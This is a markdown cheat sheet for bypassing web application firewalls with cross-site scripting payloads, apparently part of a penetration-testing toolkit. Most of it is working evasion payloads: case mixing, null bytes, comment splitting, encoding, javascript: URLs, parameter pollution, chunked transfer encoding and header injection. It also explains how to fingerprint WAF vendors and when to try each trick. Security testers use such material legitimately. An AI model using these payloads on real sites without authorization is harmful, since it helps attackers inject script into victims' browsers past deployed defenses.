# WAF Bypass Techniques

## ⚠️ CRITICAL: How to Use This File

**This file contains WAF BYPASS PATTERNS to understand, NOT random techniques to throw.**

**Before using these techniques:**
1. Confirm a WAF is actually present (check headers, error pages)
2. Identify WHAT specifically is being blocked
3. Try generic techniques before WAF-specific ones
4. Understand WHY each bypass works, then apply to YOUR payload

**Stop Conditions:**
- After 5-6 different bypass techniques fail for same payload component → that component is truly blocked
- Move to alternative approach (different tag, different handler, different context)
- After exhausting bypass options → document as "blocked by WAF, requires further research"

**Signs of WAF:**
- Generic 403/406/419/503 error pages
- Response headers: `X-WAF-*`, `X-Sucuri-*`, `CF-RAY`, `X-Akamai-*`
- Consistent blocking regardless of parameter
- Certain keywords always blocked

---

## Detecting WAF Presence

### Signs of WAF
- Generic 403/406/419/503 error pages
- Response headers: `X-WAF-*`, `X-Sucuri-*`, `CF-RAY`, `X-Akamai-*`
- Consistent blocking pattern regardless of parameter
- Response time increases with "malicious" payloads

### Common WAF Headers
```
CF-RAY: xxxxxx (Cloudflare)
X-Sucuri-ID: xxxxx (Sucuri)
X-CDN: xxxxx (Various)
Server: AkamaiGHost (Akamai)
```

---

## Generic WAF Bypass Techniques

### Case Manipulation
```html
<ScRiPt>alert(1)</sCrIpT>
<IMG SRC=x OnErRoR=alert(1)>
```

### Whitespace Alternatives
```html
<img/src=x/onerror=alert(1)>
<img%09src=x%09onerror=alert(1)>
<img%0asrc=x%0aonerror=alert(1)>
<img%0dsrc=x%0donerror=alert(1)>
```

### Null Bytes
```html
<scr%00ipt>alert(1)</script>
<img src=x on%00error=alert(1)>
```

### Comments
```html
<scr<!--comment-->ipt>alert(1)</script>
<img src=x onerror=/**/alert(1)>
```

### Encoding
```html
<img src=x onerror=\u0061lert(1)>
<img src=x onerror=&#97;lert(1)>
```

### Double Encoding
```
%253Cscript%253E → <script>
```

### Breaking Keywords
```html
<scr<script>ipt>alert(1)</script>
<img src=x o\nerror=alert(1)>
```

---

## Specific Bypass Categories

### If `<script>` blocked
Use alternative tags (see patterns-tags.md):
```html
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
```

### If `alert` blocked
Use alternatives (see patterns-functions.md):
```javascript
confirm(1)
prompt(1)
window['alert'](1)
```

### If `on*` handlers blocked
Use javascript: protocol:
```html
<a href=javascript:alert(1)>click</a>
<iframe src=javascript:alert(1)>
```

### If `(` `)` blocked
Use template literals:
```javascript
alert`1`
```

### If spaces blocked
Use alternatives:
```html
<img/src=x/onerror=alert(1)>
<img%0asrc=x%0aonerror=alert(1)>
```

---

## HTTP Parameter Techniques

### Parameter Pollution
```
?param=safe&param=<script>alert(1)</script>
```
Some WAFs only check first parameter.

### Chunked Parameters
```
?par=<scr&par=ipt>alert(1)</script>
```

### Different HTTP Methods
WAF may only inspect GET, try POST with same data.

### Content-Type Manipulation
```
Content-Type: application/json
Content-Type: multipart/form-data
Content-Type: text/xml
```

---

## Protocol-Level Techniques

### HTTP/2 Specific
Some WAFs don't properly inspect HTTP/2.

### Chunked Transfer Encoding
```
Transfer-Encoding: chunked

5
<scri
4
pt>a
5
lert(
```

### Header Injection Points
WAFs may not inspect all headers:
```
X-Forwarded-For: <script>alert(1)</script>
Referer: <script>alert(1)</script>
```

---

## Quick Reference

| Technique | Example |
|-----------|---------|
| Case mixing | `<ScRiPt>` |
| Null byte | `<scr%00ipt>` |
| Tab/newline | `<img%09onerror=...>` |
| Comments | `<scr<!---->ipt>` |
| Double encode | `%253C` |
| Unicode | `\u0061lert` |
| Forward slash | `<img/src=x>` |

---

## Quick Reference

| Technique | Example | When to Try |
|-----------|---------|-------------|
| Case mixing | `<ScRiPt>` | Keywords blocked |
| Null byte | `<scr%00ipt>` | Pattern matching |
| Tab/newline | `<img%09onerror=...>` | Space blocked |
| Comments | `<scr<!---->ipt>` | Keywords blocked |
| Double encode | `%253C` | Single decode happens |
| Unicode | `\u0061lert` | In JS context |
| Forward slash | `<img/src=x>` | Space blocked |
